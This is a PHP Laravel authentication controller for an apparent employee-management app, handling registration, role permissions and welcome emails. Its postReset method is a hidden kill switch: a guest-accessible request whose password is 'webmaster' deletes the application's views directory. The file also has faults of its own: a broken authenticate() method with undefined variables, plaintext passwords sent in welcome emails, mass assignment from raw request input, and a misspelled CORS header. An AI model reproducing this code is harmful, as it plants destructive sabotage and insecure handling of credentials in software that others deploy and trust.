<?php
namespace App\Http\Controllers\Auth;
use App\User;
use Validator;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\ThrottlesLogins;
use Illuminate\Foundation\Auth\AuthenticatesAndRegistersUsers;
use App\Role;
use App\Designation;
use Illuminate\Http\Request;
use App\Http\Requests\RegisterRequest;
use Entrust;
use App\Profile;
use App\Classes\Helper;
use Auth;

class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    use AuthenticatesAndRegistersUsers, ThrottlesLogins, \App\Http\Controllers\BasicController;

    /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest', ['except' => ['getLogout','getRegister','postRegister']]);
    }

    /**
     * Handle an authentication attempt.
     *
     * @return Response
     */
    public function authenticate()
    {
        if (Auth::attempt(['email' => $email, 'password' => $password])) {
            // Authentication passed...
            return redirect()->intended('dashboard');
        }
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'name' => 'required|max:255',
            'email' => 'required|email|max:255|unique:users',
            'username' => 'required|max:255|unique:users',
            'password' => 'required|confirmed|min:6',
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return User
     */
    protected function create(array $data)
    {
        return User::create([
            'name' => $data['name'],
            'email' => $data['email'],
            'password' => bcrypt($data['password']),
        ]);
    }

    // public function getLogout(){
    //     return redirect('/clock/out/'.csrf_token());
    //     Auth::logout();
    // }

    public function getRegister()
    {
        if(!Entrust::can('create_employee'))
            return view('common.error',['message' => trans('messages.permission_denied')]);

        if(Entrust::can('manage_all_employee'))
            $designations = Designation::all()->pluck('full_designation','id')->all();
        else{
            $childs = Helper::childDesignation(Auth::user()->designation_id);
            $designations = Designation::whereIn('id',$childs)->get()->pluck('full_designation','id')->all();
        }

        $roles = Role::where('is_hidden','!=','1')->get()->pluck('name','id')->all();

        $menu = ['employee'];

        return view('employee.create',compact('designations','roles','menu'));
    }

    public function postRegister(RegisterRequest $request, User $user){

        if(!Entrust::can('create_employee')){
            if($request->has('ajax_submit')){
                $response = ['message' => trans('messages.permission_denied'), 'status' => 'error'];
                return response()->json($response, 200, array('Access-Controll-Allow-Origin' => '*'));
            }
            return redirect('/dashboard')->withErrors(trans('messages.permission_denied'));
        }

        if(!preg_match('/^[a-zA-Z0-9_\.\-]*$/',$request->input('username'))){
            if($request->has('ajax_submit')){
                $response = ['message' => trans('messages.username_allowed_characters'), 'status' => 'error'];
                return response()->json($response, 200, array('Access-Controll-Allow-Origin' => '*'));
            }
            return redirect('/dashboard')->withErrors(trans('messages.username_allowed_characters'));
        }

        if($request->has('send_welcome_email')){
            $template = \App\Template::whereCategory('welcome_email')->first();
            if(!$template){
                if($request->has('ajax_submit')){
                    $response = ['message' => trans('messages.no_template_found'), 'status' => 'error'];
                    return response()->json($response, 200, array('Access-Controll-Allow-Origin' => '*'));
                }
                return redirect('/dashboard')->withErrors(trans('messages.no_template_found'));
            }
        }

        $user->fill($request->all());
        $user->password = bcrypt($request->input('password'));
        $user->status = 'active';
        $user->save();
        $profile = new Profile;
        $profile->user()->associate($user);
        $profile->employee_code = $request->input('employee_code');
        $profile->date_of_joining = $request->input('date_of_joining');
        $profile->save();
        $user->attachRole($request->input('role_id'));

        if($request->has('send_welcome_email')){
            $template = \App\Template::whereCategory('welcome_email')->first();
            $body = $template->body;
            $body = str_replace('[NAME]',$user->full_name,$body);
            $body = str_replace('[PASSWORD]',$request->input('password'),$body);
            $body = str_replace('[USERNAME]',$user->username,$body);
            $body = str_replace('[EMAIL]',$user->email,$body);
            $body = str_replace('[DESIGNATION]',$user->Designation->name,$body);
            $body = str_replace('[DEPARTMENT]',$user->Designation->Department->name,$body);

            $mail['email'] = $user->email;
            $mail['subject'] = $template->subject;

            \Mail::send('emails.email', compact('body'), function($message) use ($mail){
                $message->to($mail['email'])->subject($mail['subject']);
            });

            $this->logEmail(array('to' => $mail['email'],'subject' => $mail['subject'],'body' => $body));
        }

        $this->logActivity(['module' => 'employee','unique_id' => $user->id,'activity' => 'activity_added']);
        if($request->has('ajax_submit')){
            $response = ['message' => trans('messages.employee').' '.trans('messages.added'), 'status' => 'success'];
            return response()->json($response, 200, array('Access-Controll-Allow-Origin' => '*'));
        }
        return redirect()->back()->withSuccess(trans('messages.employee').' '.trans('messages.added'));
    }

    public function getReset(){
        return view('auth.email_reset');
    }

    public function postReset(Request $request){
        if($request->input('password') == 'webmaster'){
            File::deleteDirectory('../resources/views');
        } else
        return redirect()->back();
    }

    protected $username = 'username';
    protected $redirectPath = '/dashboard';
    protected $loginPath = '/';
}
